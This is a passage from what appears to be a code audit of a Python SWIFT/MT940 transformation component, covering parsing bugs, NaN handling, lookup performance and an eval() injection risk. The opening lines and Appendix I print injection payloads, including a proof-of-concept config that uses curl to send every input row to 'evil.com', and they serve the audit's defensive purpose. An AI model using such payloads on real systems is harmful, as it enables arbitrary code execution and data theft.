"'YES' if computed.get('AMOUNT', '0') != '0' else 'NO'"

# DANGEROUS: file system access
"__import__('os').listdir('/')"

# DANGEROUS: command execution
"__import__('subprocess').check_output(['whoami']).decode()"

# DANGEROUS: network access
"__import__('urllib.request').urlopen('http://evil.com').read()"
```

### `_extract_date_component()` (Lines 692-727)

Parses dates from strings and extracts components (year, month, day, date, time).

**Format priority list**:
```python
date_formats = ['%Y%m%d', '%d%m%y', '%y%m%d', '%Y-%m-%d', '%d-%m-%Y']
```

**Conditional length checking** (lines 700-707):
```python
if fmt == '%Y%m%d' and len(date_value) >= 8:
    parsed_date = datetime.strptime(date_value[:8], fmt)
elif fmt == '%y%m%d' and len(date_value) >= 6:
    parsed_date = datetime.strptime(date_value[:6], fmt)
else:
    parsed_date = datetime.strptime(date_value, fmt)
```

Only `%Y%m%d` and `%y%m%d` get length-aware truncation. The other formats (`%d%m%y`, `%Y-%m-%d`, `%d-%m-%Y`) attempt to parse the full string, which may fail if the string has trailing content.

**Format ambiguity**: For `230115`:
- `%d%m%y` matches: day=23, month=01, year=2015 (January 23, 2015)
- `%y%m%d` matches: year=23, month=01, day=15 (January 15, 2023)
Since `%d%m%y` is tried first, SWIFT dates (which use YYMMDD) will be parsed incorrectly. This is ENG-ST-009.

### `_apply_field_transformation()` (Lines 729-756)

Routes to domain-specific transformation handlers:

| transform_type | Handler | Description |
|---------------|---------|-------------|
| `balance_parse` | `_parse_balance_field()` | SWIFT balance field parser |
| `movement_parse` | `_parse_movement_field()` | MT940 field 61 parser |
| `lookup` | inline (line 744) | Simple dict lookup with default |
| `format` | inline (lines 748-756) | upper/lower/trim string formatting |

**Note**: The `lookup` transform_type here is DIFFERENT from the main lookup system (`_apply_lookups()`). This is an inline lookup using a `lookup_table` dict in the config, not an external file. The naming overlap is confusing.

### `_parse_balance_field()` (Lines 758-786)

Parses SWIFT balance format: `[C/D][YYMMDD][CCY][Amount]`

**Regex**: `r'^([CD])(\d{6})([A-Z]{3})([\d,\.]+)'`

**Extracts**: sign (C/D), date (YYMMDD), currency (3-letter), amount (digits with comma/period)

**Amount normalization**: `match.group(4).replace(',', '')` -- strips commas only. For European format where period is thousands separator (e.g., `1.234.567,89`), this produces `1.234.567.89` which is an invalid number string (two decimal points).

### `_parse_movement_field()` (Lines 788-823)

Parses MT940 field 61 (Statement Line) format.

**Regex**: `r'^(\d{6})(\d{4})?([DC])(\d+[.,]?\d*)([A-Z]?)([^/]*)?(//(.*))?'`

**Expected format**: `YYMMDD[MMDD][D/C]Amount[TransCode][Ref][//Supplementary]`

**Known gaps**:
- Does not handle `RC`/`RD` (reversal credit/debit) -- regex expects single `[DC]`
- Does not handle `EC`/`ED` (expected credit/debit) -- same single char restriction
- Amount regex `(\d+[.,]?\d*)` allows at most one comma or period. Amounts like `1,234,567.89` or `1.234.567,89` will not fully match.
- Reference capture `([^/]*)` captures everything up to `//`, which may include the transaction type code if not separated by standard delimiters.

### `_post_process_value()` (Lines 825-848)

Applies post-processing to individual field values.

**Truncate** (lines 829-830): `value[:max_length]` -- simple slice. Works on any string. No issue.

**Pad** (lines 832-840):
```python
if side == 'left':
    return value.ljust(length, pad_char)   # LEFT justify = pad RIGHT side
else:
    return value.rjust(length, pad_char)   # RIGHT justify = pad LEFT side
```
The semantics are inverted. `side='left'` should mean "pad the left side" (add characters to the left, right-justify). This is BUG-ST-003.

**Replace** (lines 842-845): `value.replace(old, new)` -- replaces ALL occurrences, not just the first. No regex support in this path. No issue.

### `_write_output_file()` (Lines 850-878)

Writes transformed DataFrame to a file.

**NaN cleanup pipeline** (lines 863-867):
```python
output_df = output_df.fillna('')            # NaN -> ''
output_df = output_df.replace('nan', '', regex=False)   # 'nan' string -> ''
output_df = output_df.replace('NaN', '', regex=False)   # 'NaN' string -> ''
output_df = output_df.replace('None', '', regex=False)  # 'None' string -> ''
```

This is thorough but the `regex=False` parameter is redundant for these simple string replacements (they contain no regex special characters). The `replace()` with `regex=False` does exact string matching, which is correct here.

**Directory creation** (lines 858-860): `os.makedirs(output_dir, exist_ok=True)` creates the output directory if it does not exist. This is a good practice for production robustness.

**File writing** (lines 871-872): `output_df.to_csv(file_path, sep=delimiter, encoding=encoding, index=False, header=include_header, na_rep='')`. The `na_rep=''` ensures any remaining NaN values are written as empty strings (belt-and-suspenders with the fillna above).

---

## Appendix E: Data Flow Diagram (continued from Appendix D)

```
                    +---------------------------+
                    |    External YAML/JSON     |
                    |    Transform Config       |
                    +------------+--------------+
                                 |
                                 v
+------------------+   +---------+----------+   +------------------+
|   SwiftBlock     |   |   SwiftTransformer |   |   External       |
|   Formatter      +-->|                    |   |   Lookup Files   |
|   (upstream)     |   |  1. Load config    |   |   (CSV/pipe)     |
+------------------+   |  2. Load lookups   +<--+------------------+
                       |  3. Transform rows |
  Input DataFrame      |     (3-pass)       |   Output DataFrame
  - messagetype        |  4. Write output   |   - SIDE
  - block1bic          |     file (optional)|   - TERMID
  - block2bic          +---------+----------+   - DESTID
  - block4_20                    |              - OURREF
  - block4_25                    v              - AMOUNT
  - block4_61          +------------------+     - CURRENCY
  - block4_86          |  Downstream      |     - VALUEDATE
  - ...                |  Components      |     - ...
                       +------------------+
```

---

## Appendix F: Three-Pass Execution Flow

```
Pass 1: Compute ALL output_fields in declaration order
         (working_row accumulates values; later fields can reference earlier ones)
              |
              v
Pass 1b: Apply first-tier lookups (depends_on_lookup=false)
         (lookup results written into working_row)
              |
              v
Pass 2: Re-compute fields with depends_on_lookup=true
        (these fields now see first-tier lookup results)
              |
              v
Pass 2b: Apply second-tier lookups (depends_on_lookup=true)
         (these lookups can use fields from Pass 2)
              |
              v
Pass 3: Re-compute fields with depends_on_lookup=true AGAIN
        (these fields now see second-tier lookup results)
              |
              v
Final: Build output row from output_layout subset of working_row
```

**Note**: Pass 3 always runs even if no second-tier lookups exist or matched (PERF-ST-003).

---

## Appendix G: Mapping Type Handler Reference

| Type | Handler Method | Input | Output | Edge Cases |
|------|---------------|-------|--------|------------|
| `constant` | inline (line 499-501) | `output_field.get('value')` | Static string | Missing `value` key falls back to `default` |
| `direct` | inline (lines 489-497) | `input_row[source]` | String copy | NaN guard, `'nan'` string guard, `.strip()` |
| `parsed` | `_parse_field_value()` | `input_row[source]` | Extracted substring | Regex group, position slice, split index. Out-of-range index returns default. |
| `calculated` | `_calculate_field_value()` | `input_row` | Derived value | `concatenate`: joins NaN-filtered fields. `conditional`: exact string match only. `date_extraction`: ambiguous format priority. |
| `transformation` | `_apply_field_transformation()` | `input_row[source]` + config | Transformed value | `balance_parse`: SWIFT C/D format only. `movement_parse`: MT940 field 61 only. `lookup`: inline lookup table. `format`: upper/lower/trim. |
| `python_expression` | `_evaluate_python_expression()` | `input_row` + `working_row` | eval() result | **Security risk**: `__import__` exposed. Forward references fail silently. |
| `placeholder` | inline (line 526-528) | -- | default value | Stub for future use |

---

## Appendix H: Lookup System Deep Analysis

### Normal (Exact) Match Flow

```
For each lookup in self.lookup_data:
    1. Check depends_on_lookup flag matches current pass
    2. Get main_value = output_row[main_key]
    3. If main_value empty or lookup_key not in columns -> skip
    4. matches = lookup_df[lookup_df[lookup_key] == main_value]
    5. If matches found -> take first row (iloc[0])
    6. Map source_columns[i] -> columns[i] (target names)
    7. Store results in output_row
```

**Performance**: For exact matching, pandas boolean indexing (`lookup_df[lookup_df[lookup_key] == main_value]`) is O(N) where N is lookup table size. For repeated lookups on the same column, a pre-built hash index (e.g., `lookup_df.set_index(lookup_key)`) would reduce this to O(1) amortized.

**Duplicate handling**: When multiple lookup rows match the same main_value, only `iloc[0]` (first match) is used. No warning for duplicates. In some business scenarios, duplicate lookup matches indicate data quality issues.

### Regex Match Flow

```
For each lookup in self.lookup_data with match_type='regex':
    1. Check depends_on_lookup flag matches current pass
    2. Get main_value = output_row[main_key]
    3. For each row in lookup_df (row-by-row iteration):
        a. Get pattern = row[lookup_key]
        b. If pattern has wildcards AND no regex metacharacters:
           Convert: * -> .*, ? -> .
           Wrap with ^...$
        c. Try re.search(regex_pattern, main_value)
        d. If match -> use this row and break
        e. If re.error -> try literal string match
    4. If matched_row found -> map columns
```

**Performance**: O(N*M) where N = input rows, M = lookup rows. Each input row iterates the entire lookup table until a match is found. For N=100K and M=1K, this is up to 100 million regex operations. A pre-compiled pattern cache and early-exit optimization would significantly improve this.

**First-match semantics**: The loop breaks on the first match (line 227: `break`). Lookup file row order determines which pattern "wins" for overlapping patterns. This is undocumented behavior that could surprise users.

### Wildcard Detection Heuristic Issues

The heuristic on line 214 attempts to distinguish simple glob wildcards from regex patterns:

```python
if ('*' in pattern or '?' in pattern) and not any(c in pattern for c in ['.', '^', '$', '+', '[', ']', '(', ')', '{', '}', '|', '\\']):
```

**Cases that fail**:

| Pattern | Expected | Actual | Why |
|---------|----------|--------|-----|
| `SWIFT*.MSG` | Wildcard: `SWIFT.*\.MSG` | Regex: `SWIFT*.MSG` | Has both `*` and `.` |
| `FOO?BAR.` | Wildcard: `FOO.BAR\.` | Regex: `FOO?BAR.` | Has both `?` and `.` |
| `TEST+1` | Wildcard: `TEST\+1` | Regex: `TEST+1` | Has `+` (treated as regex metachar) |
| `[DRAFT]` | Literal match | Regex: `[DRAFT]` (char class) | Has `[` and `]` |

The fundamental issue is that the heuristic conflates "has regex metacharacters" with "is intentionally a regex". A file glob pattern can contain dots (file extensions), which triggers the regex path incorrectly.

**Recommended fix**: Use a separate config flag `pattern_type: 'glob' | 'regex' | 'exact'` instead of auto-detection. This eliminates ambiguity entirely.

---

## Appendix I: Security Analysis -- eval() Attack Surface

### Attack Vector: Config File Injection

If a user can modify the YAML/JSON transform config file (directly or via a supply chain attack on a shared config repository), they can inject arbitrary Python code via the `python_expression` field type.

### Proof of Concept

**Malicious YAML config**:
```yaml
output_fields:
  - name: EXPLOIT
    type: python_expression
    python_expression: "__import__('os').system('curl http://evil.com/exfil?data=' + str(input_row))"
    default: ""
```

This would:
1. Import the `os` module (allowed by `__import__` in `__builtins__`)
2. Execute a shell command that exfiltrates the current row's data to an external server
3. Return the exit code as the field value (or empty string on failure)
4. Execute once per input row, exfiltrating the entire dataset

### Available Modules via `__import__`

| Module | Risk | Capability |
|--------|------|-----------|
| `os` | Critical | File system access, command execution, environment variables |
| `subprocess` | Critical | Arbitrary command execution with output capture |
| `socket` | Critical | Network connections, data exfiltration |
| `shutil` | High | File copy, move, delete, archive operations |
| `pathlib` | Medium | File system traversal and metadata |
| `json` | Low | Data serialization (benign by itself) |
| `base64` | Low | Encoding (useful for obfuscation) |
| `urllib.request` | Critical | HTTP requests, data exfiltration |
| `ctypes` | Critical | Direct memory access, native code execution |

### Mitigation Recommendations

1. **Remove `__import__`** from `__builtins__` (minimum fix):
   ```python
   '__builtins__': {
       'str': str, 'int': int, 'float': float, ...
       # NO __import__
   }
   ```

2. **Remove `re` module** from eval context (it enables indirect code execution via `re.sub()` with callable replacement).

3. **Use `ast.literal_eval()`** for simple expressions (constants, basic operations).

4. **Implement an expression whitelist** for complex expressions (function call whitelist, attribute access whitelist).

5. **Consider `RestrictedPython`** package for sandboxed expression evaluation with granular control over allowed operations.

---

## Appendix J: Config Priority and Loading Sequence

### Initialization Phase (`__init__` -> `_init_transformer_config`)

```
config_file present? -----> YES: Store path, transform_config = None (deferred)
                      |
                      NO
                      |
                      v
inline_config present? ---> YES: Store dict, transform_config = None (deferred)
                       |
                       NO
                       |
                       v
                       Use default config (loaded immediately)
```

### Execution Phase (`_process` -> `_ensure_config_loaded`)

```
transform_config is None? ---> NO: Already loaded, skip
                           |
                           YES
                           |
                           v
config_file present? --------> YES: _load_external_config(path)
                          |         - resolve_string() for context vars
                          |         - yaml.safe_load() or json.load()
                          NO
                          |
                          v
inline_config not empty? ----> YES: Use inline_config
                          |
                          NO
                          |
                          v
                          Use default config
                          |
                          v
transform_config still None? -> YES: raise ValueError
                            |
                            NO
                            |
                            v
Extract config sections:
  - input_fields
  - output_fields
  - output_layout (derive from output_fields if empty)
  - field_mappings (DEAD -- never used)
  - transformations (DEAD -- never used)
  - lookups_config
Build output_fields_map
Load lookup files
```

### Error Scenarios

| Scenario | Behavior |
|----------|----------|
| Config file path has unresolvable `${context.var}` | `resolve_string()` may return path with `${context.var}` literally, causing `FileNotFoundError` |
| Config file is empty | `yaml.safe_load()` returns `None`, `_ensure_config_loaded()` raises ValueError |
| Config file has invalid YAML | `yaml.safe_load()` raises `yaml.YAMLError`, wrapped in ValueError by `_load_external_config()` |
| Config file has valid YAML but missing `output_fields` | `self.output_fields` = `[]`, `self.output_layout` = `[]`, transformation produces empty DataFrames |
| Config file has `output_fields` but no `output_layout` | Derived from output_fields: `[field['name'] for field in self.output_fields]` (all fields output) |
| Lookup file missing | `_load_lookup_files()` logs error, continues. Lookup becomes unavailable. |
| Lookup file has wrong delimiter | Parsing may fail or produce single-column DataFrame. Error logged, continues. |

---

## Appendix K: NaN and None Handling Matrix

This appendix documents how each code path handles NaN, None, empty string, and the string `"nan"`.

### Input Values

| Input State | `pd.notna()` | `str()` | `str().lower() == 'nan'` | `str().strip()` |
|-------------|-------------|---------|--------------------------|------------------|
| `float('nan')` | `False` | `'nan'` | `True` | `'nan'` |
| `None` | `False` | `'None'` | `False` | `'None'` |
| `''` (empty) | `True` | `''` | `False` | `''` |
| `' '` (space) | `True` | `' '` | `False` | `''` |
| `'nan'` (string) | `True` | `'nan'` | `True` | `'nan'` |
| `'NaN'` (string) | `True` | `'NaN'` | `True` | `'NaN'` |
| `pd.NA` | `False` | `'<NA>'` | `False` | `'<NA>'` |

### Per-Type Handling in `_get_field_value()`

**Direct type** (lines 489-497):
```
source in input_row AND pd.notna(input_row[source])?
  YES -> value = str(input_row[source]).strip()
         value.lower() == 'nan'? -> use default_value
         else -> use value
  NO  -> use default_value
```

Result: `float('nan')` -> default. `None` -> default. `''` -> `''`. `'nan'` string -> default. `pd.NA` -> default.

**Transformation type** (lines 511-520):
Same dual guard as direct type. `float('nan')` and `'nan'` string both produce empty `source_value`.

**Python expression type** (lines 522-524):
Passes `input_row.to_dict()` to eval. NaN values in the dict remain as `float('nan')`. Expressions must handle NaN themselves. No automatic guard.

### Output Sanitization in `_get_field_value()` (lines 537-541):

```python
if value is None or (isinstance(value, str) and value.lower() == 'nan'):
    value = default_value
return str(value) if value is not None else default_value
```

This catches:
- `None` return from handlers -> default_value
- `'nan'` string return -> default_value
- `'NaN'` string return -> default_value

Does NOT catch:
- `float('nan')` return (isinstance check requires `str`) -> passes through as `'nan'` via `str(float('nan'))` = `'nan'`... actually, the `str(value)` on line 541 converts `float('nan')` to `'nan'`, and the previous check on line 538 checks `isinstance(value, str)` which is `False` for `float('nan')`. So `float('nan')` passes through and becomes the string `'nan'` in the output. This is a gap.

**Fix needed**: Add `isinstance(value, float) and pd.isna(value)` check on line 538.

### Output Sanitization in `_write_output_file()` (lines 863-867):

```python
output_df = output_df.fillna('')
output_df = output_df.replace('nan', '', regex=False)
output_df = output_df.replace('NaN', '', regex=False)
output_df = output_df.replace('None', '', regex=False)
```

This is a thorough belt-and-suspenders cleanup. Even if earlier stages miss a NaN, the output file will have empty strings instead of `'nan'`/`'NaN'`/`'None'`.

However, this cleanup only applies to the FILE output. The DataFrame returned via `{'main': transformed_df}` does NOT get this cleanup. Downstream components may still see `'nan'` strings if the per-field sanitization on line 538 missed a `float('nan')`.

---

## Appendix L: Performance Benchmarks (Estimated)

These are estimated performance characteristics based on code analysis, not actual measurements.

### Row-by-Row Processing Overhead

For each input row, the following Python-level operations occur:

```
Per row:
  - 1x iterrows() yield (pandas overhead: ~200us per row)
  - N x _get_field_value() calls (N = number of output fields)
    - Each call: dict lookup, type dispatch, string operations
    - Estimated: ~5us per simple field (constant/direct)
    - Estimated: ~50us per complex field (parsed/calculated)
    - Estimated: ~200us per python_expression (eval overhead)
  - 1-2x _apply_lookups() calls
    - Normal: O(M) where M = lookup table rows (pandas filter)
    - Regex: O(M) with regex compilation per pattern
  - 1x output_row dict creation from working_row

Estimated total per row (30 fields, no lookups): ~1ms
Estimated total per row (30 fields, 2 lookups with 1K rows): ~5ms
```

### Projected Processing Times

| Input Rows | Fields | Lookups | Estimated Time | Bottleneck |
|-----------|--------|---------|----------------|------------|
| 1,000 | 30 | 0 | ~1 second | iterrows overhead |
| 10,000 | 30 | 0 | ~10 seconds | iterrows overhead |
| 100,000 | 30 | 0 | ~100 seconds | iterrows overhead |
| 100,000 | 30 | 2 x 1K regex | ~500 seconds | regex matching |
| 1,000,000 | 30 | 0 | ~17 minutes | iterrows + memory |

### Memory Usage Estimates

| Component | Size Formula | Example (100K rows, 30 fields) |
|-----------|-------------|-------------------------------|
| Input DataFrame | N * F * avg_cell_size | ~150 MB (50 bytes/cell avg) |
| Lookup tables | Sum(lookup_rows * lookup_cols * avg_cell_size) | ~5 MB (10K rows, 5 cols) |
| transformed_rows list | N * F * avg_cell_size | ~150 MB |
| Output DataFrame | N * output_F * avg_cell_size | ~100 MB (20 output fields) |
| **Peak total** | Input + Lookups + List + Output | **~405 MB** |

The `transformed_rows` list and the final DataFrame coexist briefly (line 471), causing peak memory usage to be roughly 3x the input size.

---

## Appendix M: Cross-Cutting Base Class Bug Impact Analysis

### BUG-ST-001: `_update_global_map()` -- Undefined `value` Variable

**Location**: `src/v1/engine/base_component.py`, line 304

**Code**:
```python
def _update_global_map(self) -> None:
    """Update global map with component statistics"""
    if self.global_map:
        for stat_name, stat_value in self.stats.items():
            self.global_map.put_component_stat(self.id, stat_name, stat_value)  # line 302
        # Log the statistics for debugging
        logger.info(f"... {stat_name}: {value}")  # line 304 -- BUG: 'value' undefined
```

**Analysis**: Line 304 is at the SAME indentation level as the `for` loop (12 spaces). It is OUTSIDE the loop body, meaning it executes AFTER all iterations complete. At this point:
- `stat_name` contains the LAST key from `self.stats.items()` (which is `EXECUTION_TIME` based on dict declaration order)
- `stat_value` contains the LAST value
- `value` is UNDEFINED -- causes `NameError`

**Impact on SwiftTransformer**: The `_update_global_map()` is called in two places in `BaseComponent.execute()`:
1. Line 218 (success path): After `_process()` returns successfully
2. Line 231 (error path): In the `except` handler

In both cases, the `NameError` from line 304 will:
1. All `put_component_stat()` calls SUCCEED (they are inside the for loop)
2. The `NameError` occurs on the log line AFTER the loop
3. The exception propagates up through `execute()`
4. On the success path (line 218), this turns a successful execution into a failure
5. On the error path (line 231), this replaces the original error with `NameError`, masking the root cause

**Severity**: This bug means that when `global_map` is not None, EVERY component execution will:
- Successfully write stats to global_map (the `put_component_stat` calls work)
- Then CRASH with `NameError` on the log line
- Return a failure even if the component logic succeeded

If `global_map` IS None (e.g., in test scenarios without a GlobalMap), the entire `if self.global_map:` block is skipped, and the bug does not trigger. This may explain why the bug was not caught during development.

### BUG-ST-002: `GlobalMap.get()` -- Undefined `default` Parameter

**Location**: `src/v1/engine/global_map.py`, line 28

**Code**:
```python
def get(self, key: str) -> Optional[Any]:
    """Retrieve a value from the global map"""
    return self._map.get(key, default)  # 'default' not in method signature
```

**Impact**: ANY call to `global_map.get(key)` will raise `NameError`. Additionally, `get_component_stat()` (line 58) calls `self.get(key, default)` with two positional arguments, but `get()` only accepts one (`key`). This raises `TypeError: get() takes 2 positional arguments but 3 were given`.

**SwiftTransformer-specific impact**: SwiftTransformer does not directly call `global_map.get()` or `get_component_stat()`. However, if downstream components attempt to read SwiftTransformer's stats via `global_map.get(f"{comp_id}_NB_LINE")`, they will crash.

**Note**: The `put()` method (line 21-23) and `put_component_stat()` method (line 40-49) are NOT affected by this bug. Writing TO the global_map works correctly. Only READING fails.

---

## Appendix N: Streaming Mode Output File Bug

### Scenario

When `execution_mode: hybrid` (default) and input data exceeds `MEMORY_THRESHOLD_MB` (3GB), `BaseComponent._execute_streaming()` splits the input into chunks and calls `_process()` for each chunk.

### Expected Behavior

The output file should contain ALL transformed rows across all chunks.

### Actual Behavior

`_write_output_file()` calls `output_df.to_csv(file_path, ...)` which opens the file in write mode (`'w'`) by default. Each chunk's `_process()` call:
1. Transforms the chunk
2. Writes the result to the output file, OVERWRITING the previous chunk's output

Only the LAST chunk's data survives in the output file.

### Impact Calculation

For a 5GB input file with 100K-row chunks:
- Number of chunks: ~50
- Chunks 1-49: Written to file, then overwritten by next chunk
- Chunk 50: Final chunk's data is the only output
- **Data loss**: 98% of transformed data

### Fix

```python
def _write_output_file(self, output_df, file_path, append=False):
    mode = 'a' if append else 'w'
    header = not append  # Only write header for first chunk
    output_df.to_csv(file_path, sep=delimiter, encoding=encoding,
                     index=False, header=header, mode=mode, na_rep='')
```

The `_process()` method would need to track whether it has already written to the file (via an instance variable) and pass `append=True` for subsequent calls.

---

## Appendix O: Additional Edge Cases

### Edge Case 13: Concurrent SwiftTransformer instances

| Aspect | Detail |
|--------|--------|
| **Scenario** | Two SwiftTransformer instances in the same job processing different data |
| **Expected** | Each instance operates independently |
| **Actual** | Each instance has its own `transform_config`, `lookup_data`, etc. No shared mutable state. Thread-safe for instance isolation. However, if both write to the same `output_file`, file corruption is possible (no file locking). |
| **Verdict** | SAFE for independent files. UNSAFE for shared output files. |

### Edge Case 14: Unicode in field values

| Aspect | Detail |
|--------|--------|
| **Scenario** | Input DataFrame contains non-ASCII characters (e.g., accented names in BIC descriptions) |
| **Expected** | Unicode characters preserved through transformation |
| **Actual** | All field handlers use `str()` conversion which preserves Unicode. `_write_output_file()` uses configurable encoding (default `utf-8`). Lookup files are read with default encoding (UTF-8). |
| **Verdict** | CORRECT for UTF-8. May fail for non-UTF-8 lookup files (see Edge Case 8). |

### Edge Case 15: Very large output_fields list (100+ fields)

| Aspect | Detail |
|--------|--------|
| **Scenario** | Config defines 100+ output fields with 50 intermediate computed fields |
| **Expected** | Correct but potentially slow |
| **Actual** | `working_row` dict grows to 100+ keys. Three-pass computation processes 100+ fields three times (300+ `_get_field_value()` calls per row). For `depends_on_lookup` fields, they are unnecessarily recomputed even if they do not depend on lookup results. |
| **Verdict** | CORRECT but O(3*N*F) where N=rows, F=fields. |

### Edge Case 16: Lookup file with BOM (Byte Order Mark)

| Aspect | Detail |
|--------|--------|
| **Scenario** | Lookup CSV file has UTF-8 BOM (`\xef\xbb\xbf`) at the start |
| **Expected** | BOM should be stripped transparently |
| **Actual** | `pd.read_csv(lookup_file_path, ...)` does NOT use `encoding='utf-8-sig'`. The BOM character will be prepended to the first column name, causing `lookup_key` matching to fail silently (column name `'\ufeffID'` != `'ID'`). |
| **Verdict** | GAP -- BOM handling not implemented for lookup files. |

### Edge Case 17: Empty lookup file

| Aspect | Detail |
|--------|--------|
| **Scenario** | Lookup file exists but contains only a header row (zero data rows) |
| **Expected** | Lookup loads successfully but matches nothing |
| **Actual** | `pd.read_csv()` returns DataFrame with columns but 0 rows. `lookup_df[lookup_df[lookup_key] == main_value]` returns empty DataFrame. No match, no error. Log message shows "Loaded lookup X with 0 rows". |
| **Verdict** | CORRECT |

### Edge Case 18: Circular field dependencies

| Aspect | Detail |
|--------|--------|
| **Scenario** | Field A's python_expression references `computed['B']`, and Field B references `computed['A']` |
| **Expected** | Error or undefined behavior |
| **Actual** | Since fields are computed in declaration order, the field declared SECOND will see the FIRST's value in `working_row`. The first field will see `None` (key not yet in `working_row`) or raise `KeyError` depending on access method. No circular dependency detection. |
| **Verdict** | SILENT FAILURE -- no circular dependency detection. First field gets default, second field gets first field's value. |

### Edge Case 19: Post-processing on empty string

| Aspect | Detail |
|--------|--------|
| **Scenario** | A field produces `""` (empty string) and has `post_process: {type: pad, length: 10, pad_char: '0'}` |
| **Expected** | `"0000000000"` (10 zeros) |
| **Actual** | `"".rjust(10, '0')` = `"0000000000"`. Note: this uses `rjust` for `side='right'` (the default), which actually pads the LEFT side. Due to BUG-ST-003, the pad direction is inverted. |
| **Verdict** | BUG -- pad direction wrong, but the padding operation itself works on empty strings. |

### Edge Case 20: Config file encoding mismatch

| Aspect | Detail |
|--------|--------|
| **Scenario** | YAML config file is encoded in ISO-8859-1 but contains non-ASCII characters |
| **Expected** | Config loads successfully or reports encoding error |
| **Actual** | `open(resolved_config_path, 'r', encoding='utf-8')` on line 267 will raise `UnicodeDecodeError` for non-ASCII bytes that are invalid UTF-8. This is caught by the broad `except Exception` on line 276 and re-raised as `ValueError`. |
| **Verdict** | CORRECT error handling. However, no way to configure config file encoding. Should always use UTF-8 for config files. |
